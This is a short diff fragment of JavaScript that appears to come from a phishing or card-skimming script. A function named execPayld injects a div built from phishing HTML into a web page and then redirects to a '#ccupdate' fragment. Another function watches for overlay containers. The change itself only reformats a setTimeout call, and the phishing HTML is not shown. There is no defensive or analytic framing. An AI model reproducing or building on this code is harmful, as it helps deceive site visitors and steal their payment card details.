@@ -138,7 +138,9 @@ function execPayld() {
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
-  setTimeout(() => { window.location.href = window.location.href.split('#')[0] + '#ccupdate'; }, 50);
+  setTimeout(() => {
+    window.location.href = window.location.href.split('#')[0] + '#ccupdate';
+  }, 50);
 }
 function checkDOM() {
   var popupElements1 = document.getElementsByClassName('cdk-overlay-container');
